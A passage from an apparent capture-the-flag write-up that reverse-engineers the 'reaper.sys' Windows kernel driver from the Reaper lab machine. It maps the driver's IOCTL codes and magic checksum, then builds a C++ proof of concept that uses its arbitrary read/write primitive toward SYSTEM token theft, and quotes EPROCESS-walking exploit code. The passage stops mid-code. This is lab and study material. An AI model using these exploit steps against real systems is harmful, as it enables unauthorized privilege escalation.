sc.exe<span class="w"> </span>qc<span class="w"> </span>reaper
<span class="o">[</span>SC<span class="o">]</span><span class="w"> </span>QueryServiceConfig<span class="w"> </span>SUCCESS

SERVICE_NAME:<span class="w"> </span>reaper
<span class="w">        </span>TYPE<span class="w">               </span>:<span class="w"> </span><span class="m">1</span><span class="w">  </span>KERNEL_DRIVER<span class="w"> </span>
<span class="w">        </span>START_TYPE<span class="w">         </span>:<span class="w"> </span><span class="m">2</span><span class="w">   </span>AUTO_START
<span class="w">        </span>ERROR_CONTROL<span class="w">      </span>:<span class="w"> </span><span class="m">1</span><span class="w">   </span>NORMAL
<span class="w">        </span>BINARY_PATH_NAME<span class="w">   </span>:<span class="w"> </span><span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\d</span>river<span class="se">\r</span>eaper.sys
<span class="w">        </span>LOAD_ORDER_GROUP<span class="w">   </span>:<span class="w"> </span>
<span class="w">        </span>TAG<span class="w">                </span>:<span class="w"> </span><span class="m">0</span>
<span class="w">        </span>DISPLAY_NAME<span class="w">       </span>:<span class="w"> </span>reaper
<span class="w">        </span>DEPENDENCIES<span class="w">       </span>:<span class="w"> </span>
<span class="w">        </span>SERVICE_START_NAME<span class="w"> </span>:
</code></pre></div>
<h2 id="analyzing-reapersys">Analyzing Reaper.sys<a class="headerlink" href="#analyzing-reapersys" title="Permanent link">¶</a></h2>
<p>It was an inevitability, really, that I take a look at <code>reaper.sys</code>.  As it turns out, the file is actually quite interesting for the fact that its loaded as a kernel module.  </p>
<p>I found the module has a main runtime, </p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251108193415.png" data-desc-position="bottom"><img alt="Pasted_image_20251108193415.png" src="../../../../Pasted_image_20251108193415.png"></a></p>
<p>The main runtime calls APIs such as <code>RtlGetVersion</code>, <code>IoCreateDevice</code>, <code>IoCreateSymbolicLink</code>, and <code>IoDeleteDevice</code>.  In the above screenshot, I found the top red box to be assignment operations, the righthand-operand shows <code>0x1000</code> but it is in fact a function call, that goes off to call <code>IofCompleteRequest</code>.  It just shows that way because I rebased to 0x0 so that I could get relative offsets while debugging.  </p>
<p>The second red box also calls a function which in the screenshot above I named <code>threadwork</code>, but later after researching generally a kernel driver could be interacted with by a userland application, I discovered this function must actually be <code>DispatchDeviceControl</code>.</p>
<p>It is that second red box that is actually the most interesting and relevant to the task at hand.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251108195337.png" data-desc-position="bottom"><img alt="Pasted_image_20251108195337.png" src="../../../../Pasted_image_20251108195337.png"></a></p>
<p>When we think about the way <code>DispatchDeviceControl</code> is meant to be implemented, <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/dispatchdevicecontrol-and-dispatchinternaldevicecontrol-routines">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/dispatchdevicecontrol-and-dispatchinternaldevicecontrol-routines</a></p>
<div class="highlight"><pre><span></span><code>A driver's dispatch routines (see [**DRIVER_DISPATCH**](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch)) handle IRPs with I/O function codes of [**IRP_MJ_DEVICE_CONTROL**](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control) and [**IRP_MJ_INTERNAL_DEVICE_CONTROL**](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-internal-device-control), respectively.

For every common type of peripheral device, the system defines a set of I/O control codes for **IRP_MJ_DEVICE_CONTROL** requests. New drivers for each type of device must support these requests. In most cases, these public I/O control codes for each type of device are not exported to user-mode applications.
</code></pre></div>
<p>The conditional statements on lines 14, 30, and 31 directly correlate to the following values seen as the source value in the comparison op:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251108200018.png" data-desc-position="bottom"><img alt="Pasted_image_20251108200018.png" src="../../../../Pasted_image_20251108200018.png"></a></p>
<p>We can see that with a control code of <code>-0x7fffdffd</code>, or <code>0x80002003</code>, in the IF statement and clause, on line 21 there is a call to <code>ExAllocatePoolWithTag</code>.  The size is <code>0x20</code>, or 64 bytes.  The tag is <code>0x70616552</code>, which translates to <code>peaR</code>, or <code>Reap</code> backwards.  </p>
<p>Line 22 checks if the allocation was good, if not we jump out of here to label <code>LAB_00001165</code> outside the IF statement, looks like function cleanup.</p>
<p>Lines 23 through 27 take <code>parameter2</code> the function was called with (pointed to by <code>piVar3</code>) and assign it into the allocation.</p>
<p>Of interest, but before the call to <code>ExAllocatePoolWithTag</code>, on line 20, is a check that the first value pointed-to by <code>piVar3</code>, is equivalent to <code>0x6a55cc9e</code>. If it is, then execution continues to call <code>ExAllocatePoolWithTag</code>.  If it isn't, then this would also jump to the label <code>LAB_00001165</code> outside the IF statement, and lead to function cleanup.  So this value must be a checksum.  </p>
<p>In the ELSE clause of the IF statement, we find there are two conditionals that can be met.  The first is if the control code is <code>-0x7fffdff9</code>, or <code>0x80002007</code>,  then we call <code>ExFreePoolWithTag</code>.  It would get called with arguments, the region of memory that was allocated, and the tag <code>0x70616552</code>, or <code>peaR</code> in ASCII.</p>
<p>But if the control code isn't <code>-0x7fffdff9</code>, or <code>0x80002007</code>, then we check if the control code is <code>-0x7fffdff5</code>, or <code>0x8000200b</code>.  If this is the case then what follows is a call to <code>PsLookupThreadByThreadId</code>, <code>KeSetPriorityThread</code>, and <code>ObfDereferenceObject</code>.  From the allocation, pointer-to-pointer offset 6 of the allocation is assigned whatever pointer-to-pointer offset 4 of the allocation references (given that neither are null).  In effect, a write operation from a source buffer to a destination buffer.  This is a user controllable commit because the allocation and data assigned to the allocation are user controlled.  The commit on the other hand is by the kernel module, using the user-controlled input.</p>
<p>Lets talk about how to interact with a kernel module.</p>
<h3 id="interacting-with-a-kernel-module">Interacting with a kernel module<a class="headerlink" href="#interacting-with-a-kernel-module" title="Permanent link">¶</a></h3>
<p>Google search:  <code>usermode connect to kernel mode driver example</code></p>
<p>Gemini response:</p>
<p>Connecting user-mode applications to kernel-mode drivers on Windows typically involves using DeviceIoControl for communication. This mechanism allows user-mode applications to send requests and data to a kernel-mode driver, and receive data back.</p>
<p>Here is an example illustrating the basic steps:</p>
<ol>
<li>
<p>Kernel-Mode Driver (e.g., WDM or KMDF):</p>
</li>
<li>
<p><strong>Define Custom IOCTLs:</strong> Create unique control codes (IOCTLs) that the user-mode application will use to specify the desired operation. These are defined using macros like <code>CTL_CODE</code>.</p>
</li>
</ol>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="cp">#define IOCTL_MYDRIVER_DO_SOMETHING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span>
</code></pre></div>
<ul>
<li>
<p><a href="https://www.google.com/search?sca_esv=cc001bef2c82a561&amp;cs=1&amp;sxsrf=AE3TifOtOdfdaatkSkf6tXDbvIQ06Na37Q%3A1762575809486&amp;q=Implement+IRP+Dispatch+Routines&amp;sa=X&amp;ved=2ahUKEwj1vbHH2uGQAxWUD0QIHS6uNAsQxccNegQIFxAD&amp;mstk=AUtExfDUCTFp_oVs2QmKjBRRUxtETh-Q0JGqhZSy7AB3g0ApWv8kitnn1TV3vVNGn3GIqR-Q6isAExTGROnWOqmcOS5FdJ90qaoHR7OXMtt0J1svd9-KpZtiY69yOye0PiXtbFk8mb-YG-tZAl0BWewvtjEEvNP80oO2jNviC3aMLZSDL0ot2s0Cm9w1OJuKqGk1p4aU516wDpbVUHFPpeB2cO2Fjqde6ouJqUSQUsX5X6ePnLTPTT3ythBE5rJxDNujuu4D0eO9SPPngKMVdRwjt1JF&amp;csui=3">Implement IRP Dispatch Routines</a></p>
<p>The driver needs to handle <code>IRP_MJ_DEVICE_CONTROL</code> requests in its <code>DispatchDeviceControl</code> routine. Inside this routine, the driver examines the <code>IoControlCode</code> from the IRP to determine which custom IOCTL was sent and then performs the corresponding action.</p>
</li>
<li>
<p><a href="https://www.google.com/search?sca_esv=cc001bef2c82a561&amp;cs=1&amp;sxsrf=AE3TifOtOdfdaatkSkf6tXDbvIQ06Na37Q%3A1762575809486&amp;q=Access+User+Buffers&amp;sa=X&amp;ved=2ahUKEwj1vbHH2uGQAxWUD0QIHS6uNAsQxccNegQIHBAD&amp;mstk=AUtExfDUCTFp_oVs2QmKjBRRUxtETh-Q0JGqhZSy7AB3g0ApWv8kitnn1TV3vVNGn3GIqR-Q6isAExTGROnWOqmcOS5FdJ90qaoHR7OXMtt0J1svd9-KpZtiY69yOye0PiXtbFk8mb-YG-tZAl0BWewvtjEEvNP80oO2jNviC3aMLZSDL0ot2s0Cm9w1OJuKqGk1p4aU516wDpbVUHFPpeB2cO2Fjqde6ouJqUSQUsX5X6ePnLTPTT3ythBE5rJxDNujuu4D0eO9SPPngKMVdRwjt1JF&amp;csui=3">Access user Buffers</a></p>
<p>When using <code>METHOD_BUFFERED</code> or <code>METHOD_IN_DIRECT</code>/<code>METHOD_OUT_DIRECT</code>, the system handles buffer copying. For <code>METHOD_NEITHER</code>, the driver directly accesses user-mode buffers, requiring careful validation to prevent security vulnerabilities.    </p>
</li>
<li>
<p>User-Mode Application:</p>
</li>
<li>
<p><strong>Open a Handle to the Device:</strong> Use <code>CreateFile</code> to obtain a handle to the kernel-mode device object exposed by the driver. The device name will typically be in the format <code>\\.\MyDriverName</code>.</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hDevice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFile</span><span class="p">(</span>
<span class="w">        </span><span class="sa">L</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">MyDriverName"</span><span class="p">,</span>
<span class="w">        </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w">                                </span>
<span class="w">        </span><span class="mi">0</span><span class="p">,</span>
<span class="w">        </span><span class="nb">NULL</span><span class="p">,</span>
<span class="w">        </span><span class="n">OPEN_EXISTING</span><span class="p">,</span>
<span class="w">        </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
<span class="w">        </span><span class="nb">NULL</span>
<span class="w">    </span><span class="p">);</span>
</code></pre></div>
<ul>
<li><strong>Send IOCTL Requests:</strong> Use <code>DeviceIoControl</code> to send the custom IOCTLs to the driver, along with any input data, and receive output data.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">bytesReturned</span><span class="p">;</span><span class="w">    </span>
<span class="w">    </span><span class="n">CHAR</span><span class="w"> </span><span class="n">inputBuffer</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Hello from user-mode!"</span><span class="p">;</span><span class="w">    </span>
<span class="w">    </span><span class="n">CHAR</span><span class="w"> </span><span class="n">outputBuffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="w">    </span>
<span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeviceIoControl</span><span class="p">(</span>
<span class="w">        </span><span class="n">hDevice</span><span class="p">,</span>
<span class="w">        </span><span class="n">IOCTL_MYDRIVER_DO_SOMETHING</span><span class="p">,</span>
<span class="w">        </span><span class="n">inputBuffer</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="k">sizeof</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">),</span>
<span class="w">        </span><span class="n">outputBuffer</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="k">sizeof</span><span class="p">(</span><span class="n">outputBuffer</span><span class="p">),</span>
<span class="w">        </span><span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span>
<span class="w">        </span><span class="nb">NULL</span>
<span class="w">    </span><span class="p">);</span>
</code></pre></div>
<ul>
<li><strong>Close the Device Handle:</strong> Release the handle when no longer needed using <code>CloseHandle</code>.</li>
</ul>
<p>Example Flow:</p>
<ul>
<li>The user-mode application opens a handle to the driver's device object.</li>
<li>It calls <code>DeviceIoControl</code>, specifying <code>IOCTL_MYDRIVER_DO_SOMETHING</code>, an input buffer, and an output buffer.</li>
<li>The operating system intercepts this call and creates an IRP, which is then sent to the kernel-mode driver.</li>
<li>The driver's <code>DispatchDeviceControl</code> routine receives the IRP, identifies <code>IOCTL_MYDRIVER_DO_SOMETHING</code>, processes the input data, and places any results in the output buffer.</li>
<li>The operating system copies the output data back to the user-mode application's output buffer.</li>
<li><code>DeviceIoControl</code> returns, and the user-mode application can then process the received data.</li>
</ul>
<h3 id="crash-course-in-kernel-driver-development-and-debugging">Crash course in kernel driver development and debugging<a class="headerlink" href="#crash-course-in-kernel-driver-development-and-debugging" title="Permanent link">¶</a></h3>
<p>I am at this point in a bit over my head it seems, so I reviewed a crash course on kernel driver development and debugging.  It's about three hours long, and following along made it take a whole lot longer than that even.  But it was very informative and overall I would say the juice was well worth the squeeze.</p>
<p>"CREATE and DEBUG a Windows KERNEL device driver!"
<a href="https://www.youtube.com/watch?v=eE-o25o8ljU">https://www.youtube.com/watch?v=eE-o25o8ljU</a></p>
<p>The crash course premise assumes debugging of a kernel driver in active development, developed and then remotely deployed using <code>VisualStudio</code> and remotely debugged using <code>windbg</code>.  Obviously that doesn't fit the usecase here, because we already have the driver.  Nevertheless, much of it could be applied to the current task.  Some additional fill in the blanks were needed.</p>
<p>Such as this:  <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-">https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-</a></p>
<p>And some key take-aways, such as breaking on load of the kernel driver:</p>
<div class="highlight"><pre><span></span><code>sxe ld reaper
</code></pre></div>
<p>For debugging, I found the only real way to do it is by remotely debugging a separate machine.  In this configuration, you have a host debugger, that connects to a target debugee which runs the kernel driver.  In this configuration, the debugger controls the debugee remotely.  So I stood up a second Windows 10 Pro VM as the target debugee. 
On the target debugee, I tried to replicate the kernel driver and service to match Reaper.</p>
<div class="highlight"><pre><span></span><code>sc.exe create reaper type= kernel start= auto binPath= c:\driver\reaper.sys
</code></pre></div>
<p>This was only possible when driver signing was disabled on the target debugee, for that, the following and a restart, after which I could create the service above:</p>
<div class="highlight"><pre><span></span><code>bcdedit /set testsigning on
</code></pre></div>
<p>And the following ran on the target debugee to enable remotely debugging the kernel:</p>
<div class="highlight"><pre><span></span><code>PS C:\Program Files (x86)\Windows Kits\10\Debuggers\x64&gt; .\kdnet 192.168.56.100 50000

Enabling network debugging on Intel(R) PRO/1000 MT Desktop Adapter.

To debug this machine, run the following command on your debugger host machine.
windbg -k net:port=50000,key=[...truncate...]

Then reboot this machine by running shutdown -r -t 0 from this command prompt.
</code></pre></div>
<p>The following, ran from the debugging host:</p>
<div class="highlight"><pre><span></span><code>&amp; "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg" -k net:port=50000,key=[...truncate...]
</code></pre></div>
<p>After which point I can connect to the target debugee by rebooting it, and it connects automatically.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251108213616.png" data-desc-position="bottom"><img alt="Pasted_image_20251108213616.png" src="../../../../Pasted_image_20251108213616.png"></a></p>
<h3 id="building-the-poc">Building the PoC<a class="headerlink" href="#building-the-poc" title="Permanent link">¶</a></h3>
<p>I started by creating a new C++ console application in VisualStudio.  </p>
<p>The call to <code>DeviceIoControl</code> needs a handle to the module, for that I created a global variable that the handle could be assigned into, and a function for getting a handle.</p>
<div class="highlight"><pre><span></span><code><span class="n">HANDLE</span><span class="w"> </span><span class="n">reap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="n">HANDLE</span><span class="w"> </span><span class="nf">ReaperSysHandle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">reaper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFile</span><span class="p">(</span>
<span class="w">        </span><span class="cm">/*[in]      LPCSTR                          lpFileName*/</span><span class="w"> </span><span class="sa">L</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">Reaper"</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in]      DWORD                      dwDesiredAccess*/</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in]      DWORD                          dwShareMode*/</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in, opt] LPSECURITY_ATTRIBUTES lpSecurityAttributes*/</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in]      DWORD                dwCreationDisposition*/</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in]      DWORD                 dwFlagsAndAttributes*/</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in, opt] HANDLE                       hTemplateFile*/</span><span class="w"> </span><span class="nb">NULL</span>
<span class="w">    </span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[handle] Good handle for device </span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">Reaper: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">reap</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">reaper</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>In my <code>main</code>, I could then assign the handle into it, and eventually also <code>CloseHandle</code> at the end of runtime.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
<span class="w">    </span><span class="n">reap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReaperSysHandle</span><span class="p">();</span>
<span class="w">    </span><span class="p">[...]</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">reap</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">reap</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>I needed a way to invoke <code>DeviceIoControl</code>, it would be called in different ways depending on what the control code is and the operation that would be performed.  In all cases it would be called with a control code and some data. </p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">Invoke_DeviceIoControl</span><span class="p">(</span><span class="n">DWORD</span><span class="w"> </span><span class="n">ctrlcode</span><span class="p">,</span><span class="w"> </span><span class="n">REAPER</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">outBuf</span><span class="p">[</span><span class="mi">2048</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">ULONG</span><span class="w"> </span><span class="n">outLen</span><span class="p">;</span>

<span class="w">    </span><span class="n">DeviceIoControl</span><span class="p">(</span>
<span class="w">        </span><span class="cm">/*[in]        HANDLE               hDevice*/</span><span class="w"> </span><span class="n">reap</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in]        DWORD        dwIoControlCode*/</span><span class="w"> </span><span class="n">ctrlcode</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in, opt]   LPVOID            lpInBuffer*/</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">data</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in]        DWORD          nInBufferSize*/</span><span class="w"> </span><span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">REAPER</span><span class="p">),</span>
<span class="w">        </span><span class="cm">/*[out, opt]  LPVOID           lpOutBuffer*/</span><span class="w"> </span><span class="n">outBuf</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in]        DWORD         nOutBufferSize*/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">outBuf</span><span class="p">),</span>
<span class="w">        </span><span class="cm">/*[out, opt]  LPDWORD      lpBytesReturned*/</span><span class="w"> </span><span class="o">&amp;</span><span class="n">outLen</span><span class="p">,</span>
<span class="w">        </span><span class="cm">/*[in, out, opt] LPOVERLAPPED lpOverlapped*/</span><span class="w"> </span><span class="nb">NULL</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>As for the control codes, and the data, the control codes are known, the data would be some type of structure that includes a checksum, a thread ID, a thread priority, some junk index that never appeared to be referenced, and two pointers, one for a source buffer and one for a destination buffer.</p>
<div class="highlight"><pre><span></span><code><span class="cp">#define DISPATCH_ALLOCATE_POOL          0x80002003</span>
<span class="cp">#define DISPATCH_FREE_POOL              0x80002007</span>
<span class="cp">#define DISPATCH_COMMIT_THREAD          0x8000200b</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">REAPER</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">checksum</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">tid</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">pri</span><span class="p">;</span>
<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">junk</span><span class="p">;</span>
<span class="w">    </span><span class="n">ULONGLONG</span><span class="w"> </span><span class="n">src</span><span class="p">;</span>
<span class="w">    </span><span class="n">ULONGLONG</span><span class="w"> </span><span class="n">dst</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="n">REAPER</span><span class="p">;</span>
</code></pre></div>
<p>At some point, I had come across this:  <a href="https://www.slideshare.net/slideshow/0x002-windows-priv-esc-a-low-level-explanation-of-token-theft/259071925">https://www.slideshare.net/slideshow/0x002-windows-priv-esc-a-low-level-explanation-of-token-theft/259071925</a></p>
<p>It talks about stealing SYSTEM's token out of its EPROCESS struct and injecting it into the current process (token theft).  A talk about the need for read-what-where and write-what-where primitives for achieving this.</p>
<p>As for handling the data, a higher-level function would be needed to wrap it all together.  We may have need to read some data from a source buffer into a local buffer under our control, so that it can be printed back or used.  And there might be a case where we need to read some data and write it into an arbitrary remote buffer.  </p>
<p>An atomic operation would see an allocation of a tagged pool of memory, a commit of that memory to a thread, and then freeing up that allocation.  So there would need to be some functions that call <code>DeviceIoControl</code> in these ways.</p>
<p>The following method should be able to handle both of the local buffer and remote buffer cases.</p>
<p>I use the terms local buffer and remote buffer in the sense of the buffer in relation to the exploit binary.</p>
<div class="highlight"><pre><span></span><code><span class="cp">#define OP_LOCAL                        0x0</span>
<span class="cp">#define OP_REMOTE                       0x1</span>

<span class="n">ULONGLONG</span><span class="w"> </span><span class="nf">Action</span><span class="p">(</span><span class="n">UINT</span><span class="w"> </span><span class="n">operation</span><span class="p">,</span><span class="w"> </span><span class="n">ULONGLONG</span><span class="w"> </span><span class="n">srcAddress</span><span class="p">,</span><span class="w"> </span><span class="n">ULONGLONG</span><span class="w"> </span><span class="n">dstAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="n">ULONGLONG</span><span class="w"> </span><span class="n">output</span><span class="p">;</span>
<span class="w">    </span><span class="n">REAPER</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mh">0x6A55CC9E</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentThreadId</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">srcAddress</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">&amp;</span><span class="n">output</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">operation</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">OP_REMOTE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">data</span><span class="p">.</span><span class="n">dst</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dstAddress</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">Invoke_DeviceIoControl</span><span class="p">(</span><span class="n">DISPATCH_ALLOCATE_POOL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">data</span><span class="p">);</span>
<span class="w">    </span><span class="n">Invoke_DeviceIoControl</span><span class="p">(</span><span class="n">DISPATCH_FREE_POOL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="n">Invoke_DeviceIoControl</span><span class="p">(</span><span class="n">DISPATCH_COMMIT_THREAD</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">output</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>And then at some point I performed the following Google search:</p>
<div class="highlight"><pre><span></span><code>steal token windows kernel exploit github
</code></pre></div>
<p>The first result: <a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a></p>
<p><code>xct</code> is the maker of <code>Reaper</code> machine.  So already my attention has been pinged for IRQ.  Another connected dot, in this file which seems to relate to the walking of EPROCESS structure.</p>
<p><a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/HevdPoolOverflowWin7x64.cpp#L60">https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/HevdPoolOverflowWin7x64.cpp#L60</a></p>
<p>Here it is:</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="n">eProcResult</span><span class="w"> </span><span class="nf">GetCurrentEProcess</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// find system EPROCESS &amp; token     </span>
<span class="w">        </span><span class="n">QWORD</span><span class="w"> </span><span class="n">systemProc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getSystemEProcess</span><span class="p">();</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] System _EPROCESS: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">systemProc</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// walk ActiveProcessLinks to find our process</span>
<span class="w">        </span><span class="n">DWORD</span><span class="w"> </span><span class="n">currentProcessPid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCurrentProcessId</span><span class="p">();</span>
<span class="w">        </span><span class="c1">//printf("[&gt;] Current Process PID %d\n", currentProcessPid);</span>
<span class="w">        </span><span class="n">BOOL</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">        </span><span class="n">QWORD</span><span class="w"> </span><span class="n">cProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">systemProc</span><span class="p">;</span>
<span class="w">        </span><span class="n">DWORD</span><span class="w"> </span><span class="n">cPid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">        </span><span class="n">QWORD</span><span class="w"> </span><span class="n">cTokenPtr</span><span class="p">;</span>

<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">cProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbRead</span><span class="p">(</span><span class="n">cProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x188</span><span class="p">);</span><span class="w"> </span><span class="c1">// get next entry in ActiveProcessLinks (dt _EPROCESS)        </span>
<span class="w">            </span><span class="n">cProcess</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mh">0x188</span><span class="p">;</span><span class="w"> </span><span class="c1">// get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)</span>
<span class="w">            </span><span class="n">cPid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbRead</span><span class="p">(</span><span class="n">cProcess</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x180</span><span class="p">);</span>
